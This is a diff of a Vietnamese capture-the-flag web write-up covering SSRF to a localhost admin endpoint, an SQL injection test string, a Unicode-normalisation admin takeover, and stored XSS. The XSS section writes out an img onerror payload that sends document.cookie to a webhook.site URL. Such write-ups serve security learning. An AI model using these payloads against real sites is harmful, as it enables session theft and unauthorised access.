@@ -2,6 +2,7 @@
 # WEB
 ## Santa's Shop
 ![image](https://hackmd.io/_uploads/SkgODOhGZe.png)
+
 Bài này khá phức tạp và rối lúc ban đầu💀💀, cần thủ thuật Ctrl + U để xem mà nguồn và bùm:
 ![image](https://hackmd.io/_uploads/BydJOO2M-g.png)
 
@@ -87,11 +88,12 @@ try {
 
 
   Quá rõ ràng, ta tận dụng biến `image` request đến localhost (127.0.0.1) chứa endpoint `/admin.php` kèm biến `username`, `coin` do ta nhập và `secret` lấy từ việc khai thác LFI với file `/secret.txt` để hack xu
-  $\implies$** SSRF**
+  $\implies$ **SSRF**
   ![image](https://hackmd.io/_uploads/S1zK5f3Mbx.png)
 Có payload như sau `http://127.0.0.1/admin.php?username=kcsckma&coin=999936&secret=ChiCon1BuocNuaThoi~_~` 
 
 ![image](https://hackmd.io/_uploads/HklYjfnzWl.png)
+
 Việc còn lại chỉ là <kbd>F5</kbd> và mua món quà bí ẩn thôi <3
 
 ![image](https://hackmd.io/_uploads/r1fJhMnf-e.png)
@@ -130,6 +132,7 @@ async function checkVoucher(code) {
  Dù có bộ lọc giới hạn số kí tự dưới 18 nhưng biến `code` được đưa trực tiếp vào câu lệnh query về database. Ta thử `?code='+OR+1=1+--+`
  
 ![image](https://hackmd.io/_uploads/Hy9WBmnMbe.png)
+
 $\Rightarrow$ **SQL injection**
 #### Khai thác
 
@@ -260,10 +263,14 @@ Ta chuyển nghi ngờ sang con bot gọi đến `/endpoint.php`
 Kết hợp với hint rằng flag ở cookie, ta có thể mượn bot để lấy cookie admin chẳng hạn?
 
 Ta thử với lệnh js đơn giản `<script>alert(1)</script>` 
+
 ![image](https://hackmd.io/_uploads/r13NBD2G-g.png)
+
 $\implies$ `/view.php?id=....` chính là nơi ta cần con bot gọi đến để thực thi payload
 Đưa các endpoint của các bài viết khác nhau thì kết quả chỉ trả ra một dòng duy nhất:
+
 ![image](https://hackmd.io/_uploads/ByGeID2z-x.png)
+
 $\implies$ **Stored XSS** (do payload được lưu trên server)
 
 ### Khai thác
@@ -274,7 +281,9 @@ Tạo post chứa lệnh js mới để gửi cookie sang cho webhook:
 <img src="x" onerror="window.location='https://webhook.site/783debd3-b12d-49b8-a99d-43baf57caafb?c='+document.cookie">
 ```
 Sau khi nhờ bot "ghé thăm" endpoint thì: 
+
 ![image](https://hackmd.io/_uploads/Hk7ndwnfZx.png)
+
 Vậy cookie chứa flag đã được set cờ HttpOnly. Trình duyệt bảo mật không cho phép JavaScript đọc loại cookie này
 
 Ta sẽ bắt con bot thực hiện request tới /phpinfo.php để lấy nội dung trang đó kèm cookie. Vì HttpOnly chỉ chặn JavaScript đọc, nhưng không chặn trình duyệt gửi đi
@@ -293,13 +302,16 @@ Payload: (AI-generated)
 
 ## Simple Web
 ![image](https://hackmd.io/_uploads/Hyho6wnz-g.png)
+
 Với gợi ý từ author đẹp zai😋 ta có được khái niệm về chuẩn hoá unicode, sử dụng tên `ａdmin` với chữ a đầu tiên là ký tự Fullwidth để khi backend lưu trữ tên được chuẩn hóa thành `admin` với mật khẩu tuỳ chọn
 
 Khi đăng nhập, ta dùng `admin` đã được chuẩn hoá:
+
 ![image](https://hackmd.io/_uploads/rysWZdnfWl.png)
 
 
 Khi vào được trong web, ta thấy các nút đều disable (trừ logout) và nhận thêm một hint: ![image](https://hackmd.io/_uploads/HJbO-uhzbl.png)
+
 $\implies$ SSRF again
 
 Ta nghĩ ngay đến việc điền `http://127.0.0.1/flag` hoặc `http://localhost/flag` 
